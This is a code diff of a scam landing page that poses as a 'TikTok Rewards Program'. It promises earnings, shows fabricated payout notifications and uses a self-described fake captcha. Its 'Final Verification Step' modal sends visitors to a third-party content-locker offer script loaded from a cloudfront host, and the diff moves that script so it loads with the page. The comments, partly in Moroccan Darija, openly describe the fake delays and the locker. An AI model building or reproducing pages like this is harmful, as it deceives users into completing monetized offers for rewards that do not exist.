@@ -7,6 +7,18 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+<!-- ========================================== -->
+<!-- LOCKER SCRIPT (Ykoun hna bach ykoun ready) -->
+<!-- ========================================== -->
+<script type="text/javascript">
+    var TGDNv_tzF_uKZXXc = {
+        "it": 4636500,
+        "key": "457f7"
+    };
+</script>
+<script src="https://d1chbu4sfo2xhu.cloudfront.net/687fdbf.js"></script>
+
 <style>
 /* --- CSS STYLES --- */
 .tiktok-logo { width: 140px; height: 140px; margin: 0 auto 16px; animation: pulse 2s ease-in-out infinite; }
@@ -22,13 +34,12 @@ body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; back
 @keyframes scrollUp { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
 @keyframes slideInLeft { from { opacity: 0; transform: translateX(-50px); } to { opacity: 1; transform: translateX(0); } }
 @keyframes countUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
 .animate-fade-in-up { animation: fadeInUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
 .animate-fade-in { animation: fadeIn 0.5s ease forwards; opacity: 0; }
 .delay-100 { animation-delay: 0.1s; } .delay-200 { animation-delay: 0.2s; } .delay-300 { animation-delay: 0.3s; } .delay-400 { animation-delay: 0.4s; }
-
-@keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
 .container { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
 .sidebar { position: fixed; left: 16px; top: 50%; transform: translateY(-50%); width: 280px; background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); border-radius: 16px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1); border: 1px solid var(--border); padding: 16px; z-index: 40; display: none; }
@@ -70,19 +81,19 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
 .step-title { font-size: 20px; font-weight: 700; margin: 16px 0 12px; }
 .step-description { color: var(--muted); line-height: 1.6; }
 
-.modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; visibility: hidden; transition: all 0.3s ease; }
+.modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; visibility: hidden; transition: all 0.3s ease; padding: 20px; }
 .modal-overlay.active { opacity: 1; visibility: visible; }
-.modal-content { background: white; border-radius: 24px; padding: 40px; max-width: 420px; width: 90%; text-align: center; transform: scale(0.9) translateY(20px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); position: relative; }
+.modal-content { background: white; border-radius: 24px; padding: 40px; max-width: 420px; width: 100%; text-align: center; transform: scale(0.9) translateY(20px); transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); position: relative; }
 .modal-overlay.active .modal-content { transform: scale(1) translateY(0); }
 .modal-close { position: absolute; top: 16px; right: 16px; width: 36px; height: 36px; border-radius: 50%; border: none; background: transparent; cursor: pointer; display: flex; align-items: center; justify-content: center; }
 .modal-close:hover { background: rgba(0, 0, 0, 0.05); }
-.modal-title { font-size: 20px; font-weight: 700; margin-bottom: 24px; }
+.modal-title { font-size: 20px; font-weight: 700; margin-bottom: 16px; }
 .modal-amount { font-size: 64px; font-weight: 800; color: #10b981; margin-bottom: 16px; animation: countUp 0.6s ease forwards; }
-.modal-disclaimer { font-size: 14px; color: var(--muted); margin-bottom: 24px; }
+.modal-disclaimer { font-size: 14px; color: var(--muted); margin-bottom: 24px; line-height: 1.5; }
 
-.captcha-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; z-index: 200; opacity: 0; visibility: hidden; transition: all 0.3s ease; }
+.captcha-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(8px); display: flex; align-items: center; justify-content: center; z-index: 200; opacity: 0; visibility: hidden; transition: all 0.3s ease; padding: 20px; }
 .captcha-overlay.active { opacity: 1; visibility: visible; }
-.captcha-content { background: white; border-radius: 16px; padding: 32px; max-width: 480px; width: 90%; position: relative; transform: scale(0.95); transition: transform 0.3s ease; }
+.captcha-content { background: white; border-radius: 16px; padding: 32px; max-width: 480px; width: 100%; position: relative; transform: scale(0.95); transition: transform 0.3s ease; }
 .captcha-overlay.active .captcha-content { transform: scale(1); }
 .captcha-close { position: absolute; top: 16px; right: 16px; width: 32px; height: 32px; border: none; background: transparent; cursor: pointer; font-size: 24px; color: #6b7280; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
 .captcha-close:hover { background: rgba(0,0,0,0.05); color: #000; }
@@ -125,18 +136,6 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
 .footer-link { font-size: 14px; color: var(--muted); text-decoration: none; }
 .footer-link:hover { color: var(--primary); text-decoration: underline; }
 .footer-separator { color: #d1d5db; }
-
-/* Partner Offers Section Styling */
-#partnerOffers { 
-    display: none; 
-    text-align: center; 
-    margin: 40px auto; 
-    padding: 40px 24px; 
-    max-width: 600px; 
-    background: var(--card-bg); 
-    border-radius: 24px; 
-    border: 1px solid var(--border);
-}
 </style>
 </head>
 <body>
@@ -220,27 +219,6 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
         </div>
     </section>
 
-    <!-- Partner Offers Section (Replaced Iframe) -->
-    <div id="partnerOffers">
-        <h3 style="margin-bottom: 16px; font-size: 22px; font-weight: 700;">Final Step: Verify Your Account</h3>
-        <p style="margin-bottom: 24px; color: var(--muted); line-height: 1.6;">
-            To prevent bot abuse, please complete one quick offer from our trusted partner to activate your monetization dashboard.
-        </p>
-
-        <!-- CPAGrip / OGAds Script -->
-        <script type="text/javascript">
-            var TGDNv_tzF_uKZXXc = { "it": 4636500, "key": "457f7" };
-        </script>
-        <script src="https://d1chbu4sfo2xhu.cloudfront.net/687fdbf.js" defer></script>
-
-        <button type="button" class="btn" id="openPartnerOffers" style="max-width: 400px; margin: 0 auto;">
-            Continue to Partner Offers
-            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style="margin-left: 8px;">
-                <path d="M4 10H16M16 10L10 4M16 10L10 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-        </button>
-    </div>
-
     <footer class="footer">
         <div class="container">
             <p class="footer-text">The TikTok Rewards Program is currently in early access. Limited spots available for new users.</p>
@@ -255,7 +233,9 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </footer>
 </main>
 
-<!-- First Modal - Earnings -->
+<!-- ========================================== -->
+<!-- 1. FIRST MODAL - Earnings -->
+<!-- ========================================== -->
 <div class="modal-overlay" id="earningsModal">
     <div class="modal-content">
         <button class="modal-close" id="closeModal">
@@ -273,7 +253,9 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </div>
 </div>
 
-<!-- Second Modal - Fake Captcha -->
+<!-- ========================================== -->
+<!-- 2. SECOND MODAL - Fake Captcha -->
+<!-- ========================================== -->
 <div class="captcha-overlay" id="captchaModal">
     <div class="captcha-content">
         <button class="captcha-close" id="closeCaptcha">&times;</button>
@@ -293,8 +275,27 @@ h1 { font-size: clamp(28px, 5vw, 48px); font-weight: 700; line-height: 1.1; marg
     </div>
 </div>
 
+<!-- ========================================== -->
+<!-- 3. THIRD MODAL - Locker Trigger (FIXED) -->
+<!-- Hada howa li ghadi yb9a f'wassat chacha, ma ghadich ymchi ltaht! -->
+<!-- ========================================== -->
+<div class="modal-overlay" id="lockerModal">
+    <div class="modal-content">
+        <h3 class="modal-title">Final Verification Step</h3>
+        <p class="modal-disclaimer">
+            To prevent bot abuse and activate your monetization dashboard, please complete one quick action from our trusted partner.
+        </p>
+        <!-- Hna st3mlna onclick="_iE()" direct kifma tlbti -->
+        <button class="btn" onclick="triggerLocker()">
+            Continue to Partner Offers
+            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" style="margin-left: 8px;">
+                <path d="M4 10H16M16 10L10 4M16 10L10 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </button>
+    </div>
+</div>
+
 <script>
-// Wait for the entire HTML to load before running JS (Prevents "null" bugs)
 document.addEventListener('DOMContentLoaded', () => {
     
     // 1. Elements Declaration
@@ -308,8 +309,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const captchaCheckbox = document.getElementById('captchaCheckbox');
     const captchaLabel = document.getElementById('captchaLabel');
     const captchaBox = document.getElementById('captchaBox');
-    const partnerOffers = document.getElementById('partnerOffers');
-    const openPartnerOffers = document.getElementById('openPartnerOffers');
+    const lockerModal = document.getElementById('lockerModal'); // Jdid
 
     // 2. Form Submit Logic
     form.addEventListener('submit', (e) => {
@@ -324,7 +324,7 @@ document.addEventListener('DOMContentLoaded', () => {
         earningsModal.classList.remove('active');
     });
 
-    // 4. Start Now -> Opens Captcha (Standard Conversion Flow)
+    // 4. Start Now -> Opens Captcha
     startNowBtn.addEventListener('click', () => {
         earningsModal.classList.remove('active');
         setTimeout(() => {
@@ -337,7 +337,7 @@ document.addEventListener('DOMContentLoaded', () => {
         captchaModal.classList.remove('active');
     });
 
-    // 6. CORE LOGIC: Toggle Captcha -> Show Partner Offers
+    // 6. CORE LOGIC: Toggle Captcha -> Show Locker Modal (Machi ltaht!)
     function toggleCaptcha() {
         captchaCheckbox.classList.toggle('checked');
         
@@ -346,15 +346,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 // Hide Captcha Modal
                 captchaModal.classList.remove('active');
                 
-                // Show Partner Offers Section
-                if (partnerOffers) {
-                    partnerOffers.style.display = "block";
-                    partnerOffers.scrollIntoView({
-                        behavior: "smooth",
-                        block: "center"
-                    });
+                // Show Locker Modal f'wassat chacha (Center)
+                if (lockerModal) {
+                    lockerModal.classList.add('active');
                 }
-            }, 800); // 800ms fake loading delay for realism
+            }, 800); // 800ms fake loading delay
         }
     }
 
@@ -365,31 +361,22 @@ document.addEventListener('DOMContentLoaded', () => {
         if (e.target === captchaBox) toggleCaptcha();
     });
 
-    // 8. Open Partner Offers (Triggers the actual locker script)
-    if (openPartnerOffers) {
-        openPartnerOffers.addEventListener("click", () => {
-            if (typeof window._iE === "function") {
-                window._iE();
-            } else {
-                alert("The offer service is still loading. Please try again in a few seconds.");
-            }
-        });
-    }
-
-    // 9. Close modals on outside click or Escape key
+    // 8. Close modals on outside click or Escape key
     window.addEventListener('click', (e) => {
         if (e.target === earningsModal) earningsModal.classList.remove('active');
         if (e.target === captchaModal) captchaModal.classList.remove('active');
+        if (e.target === lockerModal) lockerModal.classList.remove('active');
     });
     document.addEventListener('keydown', (e) => {
         if (e.key === 'Escape') {
             earningsModal.classList.remove('active');
             captchaModal.classList.remove('active');
+            lockerModal.classList.remove('active');
         }
     });
 
     // ==========================================
-    // NOTIFICATIONS LOGIC (Sidebar & Bottom)
+    // NOTIFICATIONS LOGIC
     // ==========================================
     const notifications = [
         { name: "Grace A.", amount: 1376, initials: "GA", color: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)" },
@@ -456,6 +443,24 @@ document.addEventListener('DOMContentLoaded', () => {
     showBottomNotification();
     setInterval(showBottomNotification, 8000);
 });
+
+// ==========================================
+// LOCKER TRIGGER FUNCTION (Global)
+// ==========================================
+function triggerLocker() {
+    if (typeof window._iE === "function") {
+        window._iE(); // Hada howa li kay7l l'locker dyalk
+    } else {
+        // Ila l'script mazal ma t7mlch, ntsna chwiya w n3awdo
+        setTimeout(() => {
+            if (typeof window._iE === "function") {
+                window._iE();
+            } else {
+                alert("Chargement des offres en cours, veuillez cliquer à nouveau dans un instant.");
+            }
+        }, 1500);
+    }
+}
 </script>
 </body>
 </html>
